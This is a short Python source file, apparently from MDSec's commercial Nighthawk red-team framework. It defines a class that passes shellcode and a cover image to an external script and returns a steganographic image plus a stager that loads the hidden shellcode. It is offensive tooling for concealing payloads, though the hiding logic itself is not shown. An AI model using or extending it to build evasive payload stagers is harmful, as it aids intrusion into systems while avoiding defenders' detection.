# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import os
import sys
import json
import subprocess
import uuid
from base64 import b64decode, b64encode

class StegoStagerGen(object):
	__STEGOLDR_SCRIPT = "stegoldr.py"
	__TEMP_PATH = "./temp/"
	
	@staticmethod
	def create(shellcode_info, image_info, stego_profile):
		"""
		shellcode_info : {"shellcode_name": "shellcode_x86.bin", "shellcode_bytes":b64(...)}
		image_info: {"image_name":"foo.png", "image_bytes":b64(".PNG....etc")}
		stego_profile: {...}
		"""		
		
		filename,fileext = os.path.splitext(image_info["image_name"])

		shellcode_temp_path = StegoStagerGen.__TEMP_PATH +  str(uuid.uuid4()) + ".bin"
		image_temp_path = StegoStagerGen.__TEMP_PATH +  str(uuid.uuid4()) + fileext
		stego_profile_temp_path = StegoStagerGen.__TEMP_PATH + str(uuid.uuid4()) + ".bin"
		image_out_path = StegoStagerGen.__TEMP_PATH + str(uuid.uuid4()) + fileext
		stager_out_path = StegoStagerGen.__TEMP_PATH + str(uuid.uuid4()) + ".bin"

		try:
			with open(shellcode_temp_path, "wb") as f:
				f.write(b64decode(shellcode_info["shellcode_bytes"]))

			with open(image_temp_path, "wb") as f:
				f.write(b64decode(image_info["image_bytes"]))

			with open(stego_profile_temp_path, "wb") as f:
				f.write(str(json.dumps(stego_profile)))
			
			process = subprocess.Popen(
				[
					sys.executable,
					StegoStagerGen.__STEGOLDR_SCRIPT,
					"-i",
					shellcode_temp_path,
					"-c",
					image_temp_path,
					"-p",
					stego_profile_temp_path,
					"-oi",
					image_out_path,
					"-os",
					stager_out_path
				] + (["--x86"] if shellcode_info["x86"] else []),
				stdout=subprocess.PIPE
			)

			process.wait()
			rc = process.returncode
			out,err = process.communicate()

			if rc != 0:
				if out:
					raise Exception(out)
				return

			with open(image_out_path, "rb") as f:
				stego_image_bytes = f.read()
				
			with open(stager_out_path, "rb") as f:
				stego_stager_bytes = f.read()

			shellcode_namepart = os.path.splitext(shellcode_info["shellcode_name"])[0]

			return {"stego_stager_shellcode": b64encode(stego_stager_bytes), "stego_image_bytes": b64encode(stego_image_bytes), "stego_image_name": shellcode_namepart + "_" + image_info["image_name"]}
		except Exception as ex:
			print ex
			raise Exception(repr(ex))
		finally:
			rm_paths = [shellcode_temp_path, image_temp_path, stego_profile_temp_path, image_out_path, stager_out_path]
			for path in rm_paths:
				try:
					os.remove(path)
				except:
					pass
		return